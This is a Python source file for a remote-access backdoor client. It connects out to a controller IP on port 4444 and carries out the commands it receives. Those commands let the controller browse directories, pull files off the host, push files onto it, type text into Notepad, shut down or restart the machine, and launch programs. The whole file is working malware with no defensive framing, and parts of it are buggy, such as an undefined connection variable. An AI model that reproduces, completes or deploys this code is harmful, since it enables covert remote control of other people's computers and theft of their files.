import socket, os
import pyautogui as pag

def type_msg(msg):
    os.system("start notepad")
    for char in msg:
        pag.press(char)

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)


#change it to server ip later
host='192.168.43.42'

port=4444


s.connect((host,port))


while 1:


    while 1:

        command=s.recv(1024)
        command=command.decode()

        if command=="pwd" or command=="gcwd":
            pwd=os.getcwd()
            s.send(pwd.encode())

        elif command=="ls" or command=="dir":
            files=os.listdir()
            s.send(str(files).encode())

        elif command.split(":")[0]=="cd":
            tdir=s.recv(1024).decode()
            os.chdir(tdir)

        elif command.split(":")[0]=="tdownload":
            tfpath=s.recv(1024).decode()
            fdata=open(tfpath,'r').read()
            fsize=len(fdata)
            s.send(str(fsize).encode())
            s.send(fdata.encode())

        elif command.split(":")[0]=="bdownload":
            tfpath=s.recv(1024).decode()
            fdata=open(tfpath,'rb').read()
            fsize=len(fdata)
            s.send(str(fsize).encode())
            s.send(fdata)

        elif command.split(":")[0]=="tupload":
            fpath=s.recv(1024)
            fsize2=s.recv(1024).decode()
            print(fsize2,type(fsize2))
            fdata2=s.recv(fsize2*1000+10).decode()
            nfile2=open(fpath,'w').write(fdata2)

        elif command.split(":")[0]=="bupload":
            fpath=s.recv(1024)
            fsize2=int(s.recv(1024).decode())
            fdata2=conn.recv(fsize2*1000+10)
            nfile2=open(fpath,'wb').write(fdata2)

        elif command.split(":")[0]=="type":
            msg=command.split(":")[1]
            type_msg(msg)

        elif command=="shutdown":
            os.system("shutdown -t 00 -s")

        elif command=="restart":
            os.system("shutdown -t 00 -r")
            


        elif command.split(":")[0]=="run" or command.split(":")[0]=="exec":
            prog=s.recv(1024).decode()
            os.startfile(prog)

        
           
            
            

        
